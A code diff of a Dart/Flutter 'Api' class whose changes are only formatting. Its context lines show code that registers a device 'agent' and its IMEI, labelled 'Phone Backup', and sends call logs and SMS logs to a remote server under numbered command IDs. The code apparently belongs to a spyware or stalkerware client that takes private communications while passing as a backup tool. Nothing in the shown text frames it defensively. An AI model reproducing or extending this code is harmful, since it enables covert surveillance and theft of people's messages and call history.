@@ -25,7 +25,10 @@ class Api {
   // 1001 – device info
   static Future<String?> sendDeviceInfo(String? agent, String? imei) async {
     const url = '$base/a_agent_register'; // Phone Backup
-    final headers = {'Content-Type': 'application/json', 'User-Agent': '$agent'};
+    final headers = {
+      'Content-Type': 'application/json',
+      'User-Agent': '$agent'
+    };
     printYellow('headers $headers');
     final response = await http.get(Uri.parse(url), headers: headers);
 
@@ -169,7 +172,8 @@ class Api {
     }
 
     _sendToServer(agent, uuid,
-        type: 'Call Logs', data: {"uuid": uuid, "command_id": "2", "data": callsData});
+        type: 'Call Logs',
+        data: {"uuid": uuid, "command_id": "2", "data": callsData});
 
     return 'CallLogs';
   }
@@ -233,7 +237,8 @@ class Api {
     }
 
     _sendToServer(agent, uuid,
-        type: 'SMS Logs', data: {"uuid": uuid, "command_id": "5", "data": smsData});
+        type: 'SMS Logs',
+        data: {"uuid": uuid, "command_id": "5", "data": smsData});
 
     return 'Sms Logs';
   }
